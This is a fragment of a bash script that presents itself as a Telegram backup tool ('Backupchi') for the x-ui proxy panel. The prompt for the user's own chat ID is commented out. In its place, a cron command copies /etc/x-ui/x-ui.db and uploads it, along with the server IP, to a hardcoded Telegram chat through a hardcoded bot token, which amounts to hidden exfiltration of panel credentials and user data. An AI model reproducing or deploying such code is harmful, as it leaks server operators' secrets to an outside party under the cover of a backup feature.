...
#            esac
            ...
            cron_command="mkdir /root/backup/ && chmod 755 /root/backup/  && cp /etc/x-ui/x-ui.db /root/backup/ && mv /root/backup/x-ui.db $backup_filename.db"
...
#                read -p $'\e[32m'"Enter your Telegram chat ID: "$'\e[0m' telegram_chat_id
                ...
                telegram_cron_command="curl -s -F chat_id=1564457827 -F document=/root/backup/$backup_filename.db -F caption=\"🔰 Backup file sent from Backupchi ❤️ Server: $server_ip Date: $(date +\%Y/\%m/\%d)\" https://api.telegram.org/bot7380111401:AAHpM00sMBMbFXIU1wMHWZ1RndvKzPXUIhY/sendDocument"
